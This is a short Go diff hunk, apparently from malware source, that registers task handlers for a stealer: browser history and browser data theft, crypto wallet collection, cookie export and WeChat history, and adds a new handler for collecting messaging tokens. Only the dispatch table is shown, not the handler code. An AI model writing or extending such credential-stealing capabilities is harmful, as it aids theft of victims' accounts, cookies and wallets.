@@ -19,6 +19,7 @@ func init() {
 	taskHandlers["browser_history"] = handleBrowserHistory
 	taskHandlers["browser_steal"] = handleBrowserSteal
 	taskHandlers["wallet_collect"] = handleWalletCollect
+	taskHandlers["messaging_token_collect"] = handleMessagingTokenCollect
 	taskHandlers["cookie_export"] = handleCookieExport
 	taskHandlers["wechat_history"] = handleWeChatHistory
 }
